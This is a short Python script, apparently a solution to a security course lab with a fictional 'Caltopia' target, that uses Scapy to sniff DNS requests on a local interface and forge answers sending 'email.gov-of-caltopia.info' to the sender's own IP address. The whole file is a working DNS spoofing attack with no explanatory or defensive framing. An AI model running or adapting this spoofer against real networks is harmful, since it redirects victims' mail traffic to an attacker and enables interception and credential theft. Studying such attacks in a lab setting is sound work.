#!/var/lib/python/python-q4

from scapy.config import Conf
Conf.ipv6_enabled = False
from scapy.all import *
import prctl

my_ipaddr = get_if_addr('eth0')

def handle_packet(pkt):
    if DNS in pkt and pkt.haslayer(UDP) and pkt[UDP].dport == 53:
        # This is a DNS request
        governor_ip = pkt[IP].src
        requested_name = pkt[DNS].qd.qname
        if requested_name == "email.gov-of-caltopia.info.":
            ip = IP(dst=pkt[IP].src, src=pkt[IP].dst, ihl=5)
            udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
            dns_qd = pkt[DNS].qd
            dns_an = DNSRR(rrname=dns_qd.qname, type=dns_qd.qtype, rclass=dns_qd.qclass, ttl=2048, rdata=my_ipaddr)
            dns = DNS(id=pkt[DNS].id, qdcount=1, ancount=1, qr=1, rd=1, ra=1,  qd=dns_qd, an=dns_an)
            request = ip / udp / dns
            send(request)

if not (prctl.cap_effective.net_admin and prctl.cap_effective.net_raw):
    print "ERROR: I must be invoked via `./pcap_tool.py`, not via `python pcap_tool.py`!"
    exit(1)


sniff(prn=handle_packet, filter='ip', iface='eth0')

